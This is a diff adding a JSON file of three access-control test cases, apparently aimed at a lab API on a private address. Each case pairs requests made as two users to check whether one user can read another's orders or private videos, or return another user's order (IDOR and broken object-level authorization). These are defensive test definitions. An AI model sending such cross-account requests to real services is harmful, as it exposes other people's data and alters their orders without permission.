@@ -1,0 +1,72 @@
+[
+  {
+    "title": "IDOR: View other user's order details",
+    "severity": "high",
+    "comparator": "cross_account_resource",
+    "setup": [
+      { "url": "http://172.20.0.12/workshop/api/shop/orders/all", "method": "GET", "headers": {}, "as": "self" }
+    ],
+    "control": {
+      "url": "http://172.20.0.12/workshop/api/shop/orders/{{setup.0.data.0.id}}",
+      "method": "GET",
+      "headers": {},
+      "as": "self"
+    },
+    "variant": {
+      "url": "http://172.20.0.12/workshop/api/shop/orders/{{setup.0.data.0.id}}",
+      "method": "GET",
+      "headers": {},
+      "as": "second"
+    },
+    "rationale": "If the variant (second user) receives the same order details as control (self), object-level authorization is broken."
+  },
+  {
+    "title": "IDOR: Access other user's private video",
+    "severity": "high",
+    "comparator": "cross_account_resource",
+    "setup": [
+      { "url": "http://172.20.0.12/identity/api/v2/user/videos", "method": "GET", "headers": {}, "as": "self" }
+    ],
+    "control": {
+      "url": "http://172.20.0.12/identity/api/v2/user/videos/{{setup.0.data.0.id}}",
+      "method": "GET",
+      "headers": {},
+      "as": "self"
+    },
+    "variant": {
+      "url": "http://172.20.0.12/identity/api/v2/user/videos/{{setup.0.data.0.id}}",
+      "method": "GET",
+      "headers": {},
+      "as": "second"
+    },
+    "rationale": "If second user retrieves the same video as self, the app fails to enforce user-scoped access on videos."
+  },
+  {
+    "title": "Unauthorized order return by another user",
+    "severity": "critical",
+    "comparator": "state_changed",
+    "setup": [
+      { "url": "http://172.20.0.12/workshop/api/shop/orders/all", "method": "GET", "headers": {}, "as": "self" }
+    ],
+    "control": {
+      "url": "http://172.20.0.12/workshop/api/shop/orders/{{setup.0.data.0.id}}",
+      "method": "GET",
+      "headers": {},
+      "as": "self"
+    },
+    "act": {
+      "url": "http://172.20.0.12/workshop/api/shop/orders/return_order",
+      "method": "POST",
+      "headers": {"Content-Type": "application/json"},
+      "body": {"order_id": "{{setup.0.data.0.id}}"},
+      "as": "second"
+    },
+    "variant": {
+      "url": "http://172.20.0.12/workshop/api/shop/orders/{{setup.0.data.0.id}}",
+      "method": "GET",
+      "headers": {},
+      "as": "self"
+    },
+    "rationale": "If the order's status changes after a second user issues a return, the application does not verify order ownership."
+  }
+]
